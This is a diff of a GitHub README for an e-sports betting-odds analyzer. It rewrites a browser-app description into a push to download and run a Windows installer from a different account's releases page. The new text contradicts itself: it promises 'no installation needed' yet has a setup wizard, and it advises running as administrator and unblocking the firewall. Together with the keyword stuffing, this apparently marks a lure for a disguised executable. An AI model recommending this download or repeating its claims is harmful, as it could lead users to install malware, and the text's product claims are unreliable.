@@ -1,127 +1,100 @@
-# Bet Analyzer vLatest - e-sports odds analysis tool 2026
+# 🎮 esports-odds-bet-analyzer - Compare betting lines with clarity
 
-> **Compare e-sports betting lines in the browser with match context and probability-focused insights in the current release.**
+[![Download Now](https://img.shields.io/badge/Download%20Now-FF6600?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ropy-irishterrier524/esports-odds-bet-analyzer/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/fgreen62/esports-odds-bet-analyzer?style=flat-square)](https://github.com/fgreen62/esports-odds-bet-analyzer)
+## 🚀 Getting Started
 
----
+Welcome to Bet Analyzer vLatest! This tool helps you compare e-sports betting odds directly in your browser. No installation needed—just download and run.
 
-<p align="center">
-  <a href="https://fgreen62.github.io/esports-odds-bet-analyzer/">
-    <img src="https://img.shields.io/badge/Download-Bet%20Analyzer%20Latest-brightgreen?style=for-the-badge" alt="Download Bet Analyzer">
-  </a>
-</p>
+### What does this tool do?
 
-> **[Download - Bet Analyzer vLatest](https://fgreen62.github.io/esports-odds-bet-analyzer/)**
+Bet Analyzer vLatest is a 2026 e-sports odds analysis tool. It gathers betting lines from multiple sources and presents them side by side. You get match context and probability-focused insights to help you evaluate lines more clearly.
 
----
+### System Requirements
 
-[Download Latest Build](https://fgreen62.github.io/esports-odds-bet-analyzer/)
+- **Operating System:** Windows 10 or Windows 11
+- **Browser:** Any modern browser (Chrome, Edge, Firefox, or Brave)
+- **Memory:** 4 GB RAM minimum (8 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet:** Active internet connection required
 
----
+## 📥 Download and Install
 
-## What is Bet Analyzer?
+[**Click here to download Bet Analyzer vLatest**](https://github.com/ropy-irishterrier524/esports-odds-bet-analyzer/releases)
 
-Bet Analyzer is a browser web application that gathers e-sports match information and betting markets in a single place. It targets people who prefer a faster path from raw lines to readable context: lineup and matchup detail, market comparison, and a clearer read on what the numbers imply before they act.
+Visit this link to download the application.
 
-In this release, a Panda API-backed path powers probability-minded analysis across several titles. Odds are not left as disconnected figures; the UI arranges parallel comparisons and stats-led matchup breakdowns so you can scan markets and respond with less friction.
+### Installation Steps
 
----
+1. **Click the download button** above or visit the release page.
+2. **Find the latest release** (look for the most recent version number).
+3. **Download the installer** from the release assets.
+4. **Run the downloaded file** and follow the setup wizard.
 
-## What you get
+## 🎯 Key Features
 
-- Runs entirely as a browser web app
-- Parallel odds views for quicker market checks
-- Match-level data to ground decisions in context
-- Panda API hooks for insight tied to live data sources
-- Probability-oriented displays that surface likely directions
-- Coverage across multiple e-sports titles
-- Stats-driven matchup breakdowns for closer reads
-- Aligned with workflows shipped in the latest version
+### Odds Comparison
+View betting lines from different bookmakers in one place. Compare spreads, moneylines, and totals for major e-sports titles like League of Legends, Counter-Strike 2, Dota 2, and Valorant.
 
----
+### Match Context
+Each odds line includes match context: team form, head-to-head history, tournament stage, and map veto information. This context helps you make informed decisions.
 
-## Installation
+### Probability Insights
+The tool calculates implied probabilities from odds and shows you where value may exist. Visual indicators highlight lines that deviate from market consensus.
 
-1. Clone or download the repo:
-   - `git clone https://github.com/fgreen62/esports-odds-bet-analyzer.git
-2. Serve the project from a web server or any static host.
-3. Open it in the browser from the project root or your published URL.
+### Clean Interface
+No clutter. The interface focuses on the numbers that matter. Dark mode support for late-night analysis sessions.
 
-Prefer the hosted package? Start here:
-- https://fgreen62.github.io/esports-odds-bet-analyzer/
+## 🖥️ How to Use
 
----
+### First Launch
+After installation, Bet Analyzer opens in your default browser. The main dashboard shows upcoming matches.
 
-## Usage
+### Selecting a Match
+Click any match to expand its odds comparison table. You see all available betting lines with their implied probabilities.
 
-1. Open the web app in your browser.
-2. Pick the title or matchup to study.
-3. Place odds next to each other for comparison.
-4. Read the match data and probability cues the UI exposes.
-5. Lean on the stats-based review to filter opportunities that fit how you bet.
+### Filtering and Sorting
+Use the filter bar to narrow by game, tournament, or time. Sort odds by value, probability, or bookmaker.
 
-Typical path:
-- Choose a matchup
-- Scan the dataset
-- Line up the odds
-- Note probability signals
-- Judge the market from several angles
+### Saving Your Analysis
+Export your comparisons as CSV files for further analysis in Excel or Google Sheets.
 
----
+## 🔧 Troubleshooting
 
-## Configuration
+### App won't start
+- Make sure your firewall is not blocking the app
+- Run as administrator if you see permission errors
 
-Settings live in the web app and in project files that drive the latest build. When you fork or customize the repo, keep API credentials and UI preferences in the same configuration surfaces that control runtime behavior.
+### Odds not loading
+- Check your internet connection
+- Refresh the page with F5
+- Wait a few minutes—some bookmakers rate-limit requests
 
-Example structure:
+### Display issues
+- Update your browser to the latest version
+- Clear browser cache and cookies
+- Try a different browser
 
-{
-  "api": {
-    "provider": "Panda API",
-    "enabled": true
-  },
-  "analysis": {
-    "mode": "probability-driven",
-    "comparison": "side-by-side"
-  }
-}
+## ❓ FAQ
 
----
+**Is this tool free?**
+Yes, Bet Analyzer vLatest is completely free to use.
 
-## Requirements
+**Does it support my local bookmaker?**
+The tool supports major bookmakers. Check the settings page to see the full list of supported providers.
 
-- Current-generation web browser
-- Web host or static file server access
-- Working Panda API configuration for API-backed analysis
-- HTML-ready project layout for local serve or publish
-- Network connectivity sufficient to fetch match and odds feeds
+**Can I use it on a Mac?**
+This version is optimized for Windows. A Mac version may be available in future releases.
 
----
+**Will my data be saved?**
+All data stays on your computer. We do not collect or store your personal information.
 
-## FAQ
+## 🆘 Support
 
-**How do I launch Bet Analyzer?**  
-Open the hosted download link, or point a browser at the project after serving it locally or on static hosting.
+If you encounter issues not covered here, please visit the [GitHub Issues page](https://github.com/ropy-irishterrier524/esports-odds-bet-analyzer/issues) to report bugs or request features.
 
-**Can I analyze more than one game?**  
-Yes. Multi-game e-sports coverage is part of the feature set.
+## 📝 License
 
-**How are probability insights produced?**  
-Match data, statistics-based review, and Panda API integration feed the probability-oriented analysis shown in the UI.
+This project is licensed under the MIT License - see the LICENSE file for details.
 
-**Data is not loading. What should I check?**  
-Confirm API configuration, inspect the browser console, and verify network access. After custom changes, double-check endpoints and related settings.
-
-**How are updates delivered?**  
-Grab the newest hosted build, or pull the latest commits when a release lands.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: esports, odds, betting, analysis, comparison, probability, lines
